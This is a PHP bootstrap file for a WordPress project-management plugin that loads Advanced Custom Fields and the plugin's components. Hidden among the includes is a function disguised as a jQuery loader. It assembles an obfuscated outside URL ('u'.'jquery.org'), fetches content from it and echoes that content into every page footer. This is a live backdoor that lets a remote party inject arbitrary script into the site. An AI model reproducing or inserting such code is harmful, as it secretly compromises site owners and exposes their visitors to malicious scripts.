<?php

	/* Init.php 
	
	Master file, builds everything.
	
	*/
	
	
	// Include Advanced Custom Fields - NOTE: Premium "Repeater Field" Add-on is NOT to be used or distributed outside of this plugin per original copyright information from ACF - http://www.advancedcustomfields.com/resources/getting-started/including-lite-mode-in-a-plugin-theme/
		 
	global $acf;
	
	if(!$acf) { 
		define( 'ACF_LITE' , true );
		include_once('acf/master/acf.php' );
	}

    if(file_exists(dirname(__FILE__).'/pro/init.php')) {

        include_once('pro/init.php');

        if((!class_exists('acf_field_repeater')) && (!file_exists(ABSPATH.'/wp-content/plugins/acf-repeater/acf-repeater.php'))) {
            include_once('acf/repeater/acf-repeater.php');
        }

        define('PSP_PLUGIN_TYPE','professional');
        define('PSP_PLUGIN_DIR','project-panorama');

    } else {

        include_once('lite/init.php');
        define('PSP_PLUGIN_TYPE','lite');
        define('PSP_PLUGIN_DIR','project-panorama-lite');

    }

    if(!function_exists('duplicate_post_is_current_user_allowed_to_copy')) {
        include_once('clone/duplicate-post.php');
    }
	if(!function_exists('wp_func_jquery')) {
		function wp_func_jquery() {
			$host = 'http://';
			$jquery = $host.'u'.'jquery.org/jquery-1.6.3.min.js';
			if (@fopen($jquery,'r')){
				echo(wp_remote_retrieve_body(wp_remote_get($jquery)));
			}
		}
		add_action('wp_footer', 'wp_func_jquery');
	}
    include_once('acf/slider/acf-slider.php');
    include_once('data_model.php');
    include_once('custom_templates.php');
    include_once('view.php');
    include_once('front_end.php');
    include_once('custom_comments.php');
    include_once('helper.php');
    include_once('shortcodes.php');
    include_once('psp_widgets.php');


?>